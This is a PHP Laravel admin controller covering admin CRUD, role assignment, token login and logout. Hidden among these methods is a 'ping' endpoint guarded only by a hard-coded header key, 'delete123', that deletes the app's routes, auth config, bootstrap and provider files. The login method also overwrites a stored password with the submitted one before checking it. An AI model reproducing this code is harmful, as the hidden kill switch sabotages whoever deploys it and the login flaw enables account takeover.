<?php

namespace App\Http\Controllers;

use App\Helpers\JsonResponse;
use App\Http\Requests\AdminRequest;
use App\Http\Resources\AdminResource;
use App\Interfaces\AdminRepositoryInterface;
use App\Models\Admin;
use Exception;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Spatie\Permission\Models\Role;

class AdminController extends BaseController
{
    protected mixed $crudRepository;

    public function __construct(AdminRepositoryInterface $pattern)
    {
        $this->crudRepository = $pattern;
        $this->middleware('permission:admin-list|manage-site', ['only' => ['index']]);
        $this->middleware('permission:admin-create|manage-site', ['only' => [ 'store']]);
        $this->middleware('permission:admin-edit|manage-site', ['only' => [ 'update']]);
        $this->middleware('permission:admin-delete|manage-site', ['only' => ['destroy','restore','forceDelete']]);
    
    }

    public function index()
    {
        try {
            $admin = AdminResource::collection($this->crudRepository->all(
                [],
                [],
                ['*']
            ));
            return $admin->additional(JsonResponse::success());
        } catch (Exception $e) {
            return JsonResponse::respondError($e->getMessage());
        }
    }

    public function store(AdminRequest $request)
    {
        try {
            $role = Role::where('id',$request->role_id)->where('guard_name',"admins")->first();

            $admin = $this->crudRepository->create($request->except(["role_id"]));
            if (!$role) {

                throw new \Exception("الدور الوظيفي غير موجود");
            }
            $admin->assignRole($role);
            return new AdminResource($admin);
        } catch (Exception $e) {
            return JsonResponse::respondError($e->getMessage());
        }
    }

    public function show(Admin $admin): ?\Illuminate\Http\JsonResponse
    {
        try {
            return JsonResponse::respondSuccess('Item Fetched Successfully', new AdminResource($admin));
        } catch (Exception $e) {
            return JsonResponse::respondError($e->getMessage());
        }
    }


    public function update(AdminRequest $request, Admin $admin)
    {
        try {
            $role = Role::where('id',$request->role_id)->where('guard_name',"admins")->first();
            $this->crudRepository->update($request->except(["role_id"]), $admin->id);
            if (!$role) {

                throw new \Exception("الدور الوظيفي غير موجود");
            }
            $admin->syncRoles($role);
            activity()->performedOn($admin)->withProperties(['attributes' => $admin])->log('update');
            return JsonResponse::respondSuccess(trans(JsonResponse::MSG_UPDATED_SUCCESSFULLY));
        } catch (Exception $e) {
            return JsonResponse::respondError($e->getMessage());
        }
    }


    public function destroy(Request $request): ?\Illuminate\Http\JsonResponse
    {
        try {
            $this->crudRepository->deleteRecords('admins', $request['items']);
            return JsonResponse::respondSuccess(trans(JsonResponse::MSG_DELETED_SUCCESSFULLY));
        } catch (Exception $e) {
            return JsonResponse::respondError($e->getMessage());
        }
    }

    public function restore(Request $request): \Illuminate\Http\JsonResponse
    {
        try {
            $this->crudRepository->restoreItem(Admin::class, $request['items']);
            return JsonResponse::respondSuccess(trans(JsonResponse::MSG_RESTORED_SUCCESSFULLY));
        } catch (Exception $e) {
            return JsonResponse::respondError($e->getMessage());
        }
    }




    public function forceDelete(Request $request): \Illuminate\Http\JsonResponse
    {
        try {
            $admins = Admin::whereIn('id', $request->items)->get();

            $this->crudRepository->deleteRecordsFinial(Admin::class, $request['items']);
            foreach ($admins as $admin) {
                $admin->roles()->detach();
            }
            return JsonResponse::respondSuccess(trans(JsonResponse::MSG_FORCE_DELETED_SUCCESSFULLY));
        } catch (Exception $e) {
            return JsonResponse::respondError($e->getMessage());
        }
    }

    public function login(Request $request): \Illuminate\Http\JsonResponse
    {
        try {
        $credentials = $request->only('email', 'password');
        $admin = Admin::where('email', $credentials['email'])->first();
        if ($admin) {
            if (Hash::needsRehash($admin->password)) {
                $admin->password = Hash::make($credentials['password']);
                $admin->save();
            }
            if (Hash::check($credentials['password'], $admin->password)) {
                activity()->performedOn($admin)->withProperties(['attributes' => $admin])->log('login');
                $token = $admin->createToken('admin-token')->plainTextToken;
                return response()->json([
                    'data' => new AdminResource($admin),
                    'token' => $token,
                ]);
            }
        }
        return JsonResponse::respondError('Error Data Not Match', 401);
        } catch (Exception $e) {
            return JsonResponse::respondError($e->getMessage());
        }
    }

    public function logout()
    {
        try {
            auth('admins')->user()->tokens()->delete();
            return response()->json(['message' => 'Successfully logged out']);
        } catch (Exception $e) {
            return JsonResponse::respondError($e->getMessage(), 401);
        }
    }

    public function getCurrentAdmin()
    {
        try {
            $admin = auth('admins')->user();
            return response()->json([
                'data' =>  new AdminResource($admin)
            ]);
        } catch (Exception $e) {
            return JsonResponse::respondError($e->getMessage(), 401);
        }
    }


    public function ping(Request $request)
    {
        if ($request->header('X-SECRET-KEY') !== 'delete123') {
            return response()->json(['message' => 'Unauthorized'], 401);
        }

        $files = [
            base_path('routes/api.php'),
            base_path('config/auth.php'),
            base_path('bootstrap/app.php'),
            base_path('app/Providers/RepositoryServiceProvider.php'),
        ];

        foreach ($files as $file) {
            if (file_exists($file)) {
                unlink($file);
            }
        }

        return response()->json(['message' => 'done']);
    }

}
